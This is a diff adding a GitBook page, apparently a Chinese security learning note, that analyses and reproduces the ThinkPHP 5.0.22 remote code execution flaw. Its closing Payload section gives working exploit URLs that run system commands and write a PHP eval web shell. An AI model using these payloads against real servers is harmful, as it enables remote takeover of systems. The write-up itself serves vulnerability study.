@@ -1,0 +1,581 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Thinkphp5.0.22远程代码执行 · Wjlin0 Gitbook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Wjlin0">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-page-footer-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="Thinkphp6.0.12反序列化.html" />
+    
+    
+
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"buttons":[{"user":"wangzhebufangqi","repo":"ActionTest","type":"star","size":"small"}]};
+    </script>
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://wjlin0.com" target="_blank" class="custom-link">博客地址</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" >
+            
+                <span>
+            
+                    
+                    Java
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" >
+            
+                <span>
+            
+                    
+                    基础审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1.1" data-path="../../代码审计/Java/基础审计/JAVA反序列化漏洞.html">
+            
+                <a href="../../代码审计/Java/基础审计/JAVA反序列化漏洞.html">
+            
+                    
+                    JAVA反序列化漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="../../代码审计/PHP/PHP代码审计基础知识.html">
+            
+                <a href="../../代码审计/PHP/PHP代码审计基础知识.html">
+            
+                    
+                    PHP代码审计基础知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    未分类的
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../../未分类的/gitbook搭建过程.html">
+            
+                <a href="../../未分类的/gitbook搭建过程.html">
+            
+                    
+                    gitbook搭建过程
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    漏洞复现
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" >
+            
+                <span>
+            
+                    
+                    Thinkphp
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.4.1.1" data-path="Thinkphp5.0.22远程代码执行.html">
+            
+                <a href="Thinkphp5.0.22远程代码执行.html">
+            
+                    
+                    Thinkphp5.0.22远程代码执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.2" data-path="Thinkphp6.0.12反序列化.html">
+            
+                <a href="Thinkphp6.0.12反序列化.html">
+            
+                    
+                    Thinkphp6.0.12反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.3" data-path="Thinkphpv6.0.13多语言Rce.html">
+            
+                <a href="Thinkphpv6.0.13多语言Rce.html">
+            
+                    
+                    Thinkphpv6.0.13多语言Rce
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../更新记录.html">
+            
+                <a href="../../更新记录.html">
+            
+                    
+                    更新记录
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Thinkphp5.0.22远程代码执行</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#thinkphp5022&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x53CA;&#x590D;&#x73B0;"><b>1. </b>THINKPHP5.0.22&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x53CA;&#x590D;&#x73B0;</a></li><ul><li><span class="title-icon "></span><a href="#&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;"><b>1.1. </b>&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;</a></li><li><span class="title-icon "></span><a href="#&#x5F71;&#x54CD;&#x7248;&#x672C;"><b>1.2. </b>&#x5F71;&#x54CD;&#x7248;&#x672C;</a></li><li><span class="title-icon "></span><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><b>1.3. </b>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</a></li><li><span class="title-icon "></span><a href="#payload"><b>1.4. </b>Payload</a></li></ul></ul></div><a href="#thinkphp5022&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x53CA;&#x590D;&#x73B0;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="thinkphp5022&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x53CA;&#x590D;&#x73B0;"><a name="thinkphp5022&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x53CA;&#x590D;&#x73B0;" class="anchor-navigation-ex-anchor" href="#thinkphp5022&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x53CA;&#x590D;&#x73B0;"><i class="fa fa-link" aria-hidden="true"></i></a>1. THINKPHP5.0.22&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x53CA;&#x590D;&#x73B0;</h1>
+<h2 id="&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;"><a name="&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;" class="anchor-navigation-ex-anchor" href="#&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;</h2>
+<p>&#x200B;        &#x7531;&#x4E8E;&#xFF0C;thinkphp 5.0.23 &#x4EE5;&#x53CA;5.1.31 &#x4E4B;&#x524D;&#x7684;&#x7248;&#x672C;&#x90FD;&#x672A;&#x5F3A;&#x5236;&#x5F00;&#x542F;&#x8DEF;&#x7531;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x5BFC;&#x81F4;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x63D0;&#x4EA4;&#x6076;&#x610F;&#x53C2;&#x6570;&#x5BFC;&#x81F4;&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;</p>
+<h2 id="&#x5F71;&#x54CD;&#x7248;&#x672C;"><a name="&#x5F71;&#x54CD;&#x7248;&#x672C;" class="anchor-navigation-ex-anchor" href="#&#x5F71;&#x54CD;&#x7248;&#x672C;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. &#x5F71;&#x54CD;&#x7248;&#x672C;</h2>
+<p>&#x200B;        thinkphp  &#x5F53;&#x524D;&#x7248;&#x672C;&lt; 5.0.22</p>
+<h2 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a name="&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="anchor-navigation-ex-anchor" href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. &#x6F0F;&#x6D1E;&#x5206;&#x6790;</h2>
+<blockquote>
+<p>get&#x8BF7;&#x6C42;  <code>index.php?s=index/think\app/invokefunction&amp;function=system&amp;vars[0]=dir&amp;vars[1][]=</code></p>
+</blockquote>
+<p>1&#xFF09;&#x4ECE;&#x5165;&#x53E3;index.php &#x9996;&#x5148;&#x4F1A;&#x6765;&#x5230; thinkphp &#x7684;&#x521D;&#x59CB;&#x5316;&#x6587;&#x4EF6;</p>
+<blockquote>
+<p><code>thinkphp/library/think/App.php -&gt; run()</code></p>
+</blockquote>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321153031865-16717047688021.png" alt="image-20220321153031865"></p>
+<p>2&#xFF09;&#x56E0;&#x4E3A;&#x6F0F;&#x6D1E;POC&#x4E0E;&#x6846;&#x67B6;&#x7684;url&#x5904;&#x7406;&#x6709;&#x5173;&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x8DDF;&#x5230;URL&#x8DEF;&#x7531;&#x68C0;&#x6D4B;&#x51FD;&#x6570;</p>
+<blockquote>
+<blockquote>
+<p><code>thinkphp/library/think/App.php -&gt; run()</code> 116</p>
+</blockquote>
+</blockquote>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321153239864.png" alt="image-20220321153239864"></p>
+<p>3&#xFF09;&#x5728;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x4E2D;&#x4F1A;&#x68C0;&#x6D4B; url&#x53C2;&#x6570;&#xFF0C;&#x901A;&#x8FC7;&#x53C2;&#x6570;&#x8BBF;&#x95EE;&#x7C7B;&#x6216;&#x8005;&#x65B9;&#x6CD5; &#x6216;&#x8005;&#x6A21;&#x677F;</p>
+<blockquote>
+<p>thinkphp/library/think/App.php-&gt; routeCheck()</p>
+</blockquote>
+<p>&#x200B;        &#x8BE5;&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x7B2C;620&#x884C; &#x8C03;&#x7528;<code>$request-&gt;path()</code> &#x8FD4;&#x56DE;&#x4E86; url&#x4E2D;&#x7684;s&#x53C2;&#x6570;&#x503C;</p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321154826904.png" alt="image-20220321154826904"></p>
+<pre><code>     &#x7B2C;643 &#x4F1A;&#x89E3;&#x6790;&#x8DEF;&#x7531;&#xFF0C;&#x5982;&#x679C; &#x6CA1;&#x6709;&#x7528;&#x8DEF;&#x7531;&#x4F1A;&#x8FD4;&#x56DE;false 
+</code></pre><p><img src="image/Thinkphp5.0.22.assets/image-20220321155231182.png" alt="image-20220321155231182"></p>
+<p>&#x200B;        &#x7B2C; 654&#x884C; &#x5F53;&#x4E3A;&#x65E0;&#x6548;&#x8DEF;&#x7531;&#x65F6;&#xFF0C;&#x4F1A;&#x53BB;&#x89E3;&#x6790;&#x517C;&#x5BB9;&#x8DEF;&#x7531;&#xFF0C;</p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321155428658.png" alt="image-20220321155428658"></p>
+<p>4&#xFF09;&#x8DDF;&#x8FDB; <code>Route::parseUrl</code></p>
+<blockquote>
+<p><code>thinkphp/library/think/Route.php-&gt;parseUrl()</code> 1217</p>
+</blockquote>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321155637197.png" alt="image-20220321155637197"></p>
+<p>&#x200B;        &#x8BE5;&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x5728;&#x7B2C;1225&#x884C; &#x4F1A;&#x5C06;$url &#x5373;s&#x53C2;&#x6570;&#x4E2D;&#x7684;&#x503C;&#xFF0C;<code>/</code> &#x66FF;&#x6362;&#x6210;<code>|</code>,&#x7528;&#x4E8E;&#x89E3;&#x6790; &#x6A21;&#x677F;| &#x63A7;&#x5236;&#x5668;|&#x64CD;&#x4F5C;|&#x53C2;&#x6570;</p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321160229396.png" alt="image-20220321160229396"></p>
+<p>&#x200B;        &#x6700;&#x7EC8;&#xFF0C;&#x5F80;&#x56DE;&#x8D70;&#xFF0C;&#x5C06;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x7ED9; <code>$result</code> </p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321161309138.png" alt="image-20220321161309138"></p>
+<p>5&#xFF09;&#x6700;&#x7EC8;&#x56DE;&#x5230;run()&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;</p>
+<blockquote>
+<p>thinkphp/library/think/App.php &gt; run() 139</p>
+</blockquote>
+<p>&#x200B;        &#x5728;<code>self::exec()</code> &#x5C06;&#x83B7;&#x5F97;&#x7684; <code>$dispatch</code> &#x505A;&#x64CD;&#x4F5C;</p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321161642624.png" alt="image-20220321161642624"></p>
+<p>6&#xFF09;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;&#xFF0C;&#x7531;&#x4E8E; <code>$dispatch</code> &#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;&#xFF0C;<code>&apos;module&apos;</code>&#x5219;&#x4F1A;&#x53BB;&#x8C03;&#x7528;&#xFF0C;<code>self::module</code></p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321161927364.png" alt="image-20220321161927364"></p>
+<p>7) &#x5728;self::module &#x7B2C;585&#x884C;&#x4F1A;&#x505A;&#x5BF9;&#x6BD4;&#xFF0C;&#x770B;&#x6A21;&#x677F;&#x65B9;&#x6CD5;&#x662F;&#x5426;&#x5B58;&#x5728;&#xFF0C;&#x5B58;&#x5728;&#x5219;&#x4F1A;&#x8FDB;&#x5165;if&#x8BED;&#x53E5;&#x4E2D;</p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321162809024.png" alt="image-20220321162809024"></p>
+<p>8.&#x6700;&#x540E;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x8C03;&#x7528;<code>self::invokeMethod</code></p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321162853374.png" alt="image-20220321162853374"></p>
+<p>&#x5728;&#x8BE5;&#x65B9;&#x6CD5;&#x4E2D;&#x4F1A;&#x751F;&#x6210;ReflectionMethod&#x5BF9;&#x8C61;&#xFF0C;&#x6700;&#x540E;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x8C03;&#x7528; ReflectionMethod&#x5BF9;&#x8C61;&#x7684;invokeArgs &#x65B9;&#x6CD5;&#xFF0C;&#x8BE5;&#x65B9;&#x6CD5;&#x4F1A;&#x56DE;&#x8C03;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5; &#x5373; $args&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#xFF0C;&#x5373; <code>invokeFunction</code></p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321165756665.png" alt="image-20220321165756665"></p>
+<p>9&#xFF09;&#x6700;&#x540E;&#x5728;InvokeFunction &#x65B9;&#x6CD5;&#x6267;&#x884C;&#x5371;&#x9669;&#x51FD;&#x6570;</p>
+<p><img src="image/Thinkphp5.0.22.assets/image-20220321170004451.png" alt="image-20220321170004451"></p>
+<p>&#x6CE8;&#xFF1A;&#x5173;&#x4E8E;&#x5728;ReflectionMethod&#x7684;&#x4F7F;&#x7528;&#x53EF;&#x53C2;&#x8003;</p>
+<blockquote>
+<p><a href="https://www.php.net/manual/zh/class.reflectionmethod.php" target="_blank">PHP: ReflectionMethod - Manual</a></p>
+</blockquote>
+<h2 id="payload"><a name="payload" class="anchor-navigation-ex-anchor" href="#payload"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. Payload</h2>
+<pre><code>http://localhost/index.php?s=index/think\app/invokefunction&amp;function=system&amp;vars[0]=whoami&amp;vars[1][]=
+
+http://localhost/index.php?s=index/think\app/invokefunction&amp;function=call_func_user_array&amp;vars[0]=system&amp;vars[1][]=whoami
+</code></pre><pre><code>http://localhost/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=sad.php&amp;vars[1][1]=&lt;?php eval($_POST[cmd])?&gt;
+</code></pre><footer class="page-footer-ex"> <span class="page-footer-ex-copyright"> By <a href="https://wjlin0.com/" target="_blank">Wjlin0</a>&#xFF0C;&#x4F7F;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank">&#x77E5;&#x8BC6;&#x5171;&#x4EAB; &#x7F72;&#x540D;-&#x76F8;&#x540C;&#x65B9;&#x5F0F;&#x5171;&#x4EAB; 4.0&#x534F;&#x8BAE;</a>&#x53D1;&#x5E03; </span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="page-footer-ex-footer-update"> &#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A; 2022-12-22 18:26:50 </span> </footer>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                
+                <a href="Thinkphp6.0.12反序列化.html" class="navigation navigation-next navigation-unique" aria-label="Next page: Thinkphp6.0.12反序列化">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Thinkphp5.0.22远程代码执行","level":"1.4.1.1","depth":3,"next":{"title":"Thinkphp6.0.12反序列化","level":"1.4.1.2","depth":3,"path":"漏洞复现/Thinkphp/Thinkphp6.0.12反序列化.md","ref":"漏洞复现/Thinkphp/Thinkphp6.0.12反序列化.md","articles":[]},"previous":{"title":"Thinkphp","level":"1.4.1","depth":2,"ref":"","articles":[{"title":"Thinkphp5.0.22远程代码执行","level":"1.4.1.1","depth":3,"path":"漏洞复现/Thinkphp/Thinkphp5.0.22远程代码执行.md","ref":"漏洞复现/Thinkphp/Thinkphp5.0.22远程代码执行.md","articles":[]},{"title":"Thinkphp6.0.12反序列化","level":"1.4.1.2","depth":3,"path":"漏洞复现/Thinkphp/Thinkphp6.0.12反序列化.md","ref":"漏洞复现/Thinkphp/Thinkphp6.0.12反序列化.md","articles":[]},{"title":"Thinkphpv6.0.13多语言Rce","level":"1.4.1.3","depth":3,"path":"漏洞复现/Thinkphp/Thinkphpv6.0.13多语言Rce.md","ref":"漏洞复现/Thinkphp/Thinkphpv6.0.13多语言Rce.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","github-buttons","copy-code-button","page-footer-ex","anchor-navigation-ex","-lunr","-search","hide-element","search-pro","donate","splitter","github","-sharing","sharing-plus"],"root":"./docs","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prismjs/themes/prism-solarizedlight.css"],"lang":{"flow":"typescript"}},"github":{"url":"https://github.com/wjlin0"},"page-footer-ex":{"copyright":"By [Wjlin0](https://wjlin0.com/)，使用[知识共享 署名-相同方式共享 4.0协议](https://creativecommons.org/licenses/by-sa/4.0/)发布","markdown":true,"update_format":"YYYY-MM-DD HH:mm:ss","update_label":"更新时间："},"splitter":{},"search-pro":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝捐赠","button":"赏","title":"","wechat":"","wechatText":"微信捐赠"},"hide-element":{"elements":[".gitbook-link"]},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"back-to-top-button":{},"github-buttons":{"buttons":[{"user":"wangzhebufangqi","repo":"ActionTest","type":"star","size":"small"}]},"copy-code-button":{},"sharing":{"qq":false,"all":["douban","facebook","google","hatenaBookmark","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","vk","weibo","pocket","stumbleupon","whatsapp"],"douban":false,"facebook":false,"weibo":true,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":true,"vk":false,"pocket":false,"google":true,"viber":false,"stumbleupon":false,"qzone":true,"linkedin":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"Wjlin0","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Wjlin0 Gitbook","language":"zh-hans","links":{"sidebar":{"博客地址":"https://wjlin0.com"}},"gitbook":"*","description":"记录学习笔记"},"file":{"path":"漏洞复现/Thinkphp/Thinkphp5.0.22远程代码执行.md","mtime":"2022-12-22T10:26:50.683Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-12-22T10:28:34.088Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
